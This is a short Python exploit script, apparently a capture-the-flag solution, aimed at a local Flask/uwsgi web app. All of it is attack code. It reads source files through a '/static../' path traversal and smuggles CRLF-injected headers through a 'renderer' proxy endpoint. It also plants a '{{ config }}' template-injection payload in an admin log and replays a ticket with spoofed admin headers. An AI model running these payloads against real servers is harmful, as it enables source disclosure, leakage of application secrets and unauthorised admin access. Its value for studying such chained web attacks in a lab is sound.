#!/usr/bin/python3
import requests

HOST = "http://127.0.0.1"
#source download under /home/ directory
def download(path):
    url = HOST + "/static../" + path;
    return requests.get(url).text

#proxy request with header injections
def req_with_header(url, headers = dict()):
    new_url = "%s HTTP/1.1\r\n" % url
    for x in headers:
        new_url += "%s: %s\r\n" % (x, headers[x])
    new_url += "AAAA: "

    print(new_url)

    return requests.post(HOST + "/renderer/", data = {"url": new_url}).text

#leak uwsgi -> run.py -> app/__init__.py -> app/routes.py
download("src/uwsgi.ini")
download("src/run.py")
download("src/app/__init__.py")
download("src/app/routes.py")

#write admin's log with template string, {{ config }}
first = req_with_header("http://127.0.0.1/renderer/admin", headers = {"X-Forwarded-For": "{{ config }}"})
test = req_with_header("http://127.0.0.1/renderer/admin")
print(test)

tno = first.split("ticket no ")[1].split()[0].strip()

print(tno)

second = req_with_header("http://127.0.0.1/renderer/admin/ticket?ticket=%s" % tno, headers = {"X-Forwarded-For": "127.0.0.1", "User-Agent": "AdminBrowser/1.337", "Content-Type":"text/plain", "Host": HOST[7:] + "\r\n"})

print(second)
